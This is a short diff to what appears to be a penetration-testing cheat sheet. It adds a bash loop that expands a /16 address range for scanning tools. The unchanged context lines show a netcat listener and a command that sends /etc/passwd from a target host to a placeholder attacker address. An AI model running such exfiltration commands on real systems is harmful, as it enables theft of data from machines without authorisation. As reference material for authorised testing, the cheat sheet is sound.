@@ -57,3 +57,8 @@ nc -nvlp 31337 > exfil.txt
 # on the target, use
 nc <attacker_ip_addr> 31337 < /etc/passwd # replace /etc/passwd with whatever file you want to try
 ```
+
+### if your tool can't handle cidr notation, do it the hard way (ex: is a 10.10.0.0/16)
+```bash
+for i in $(seq 1 255); do echo "10.10.$i.1-255"; done | tr "\n" ","
+```
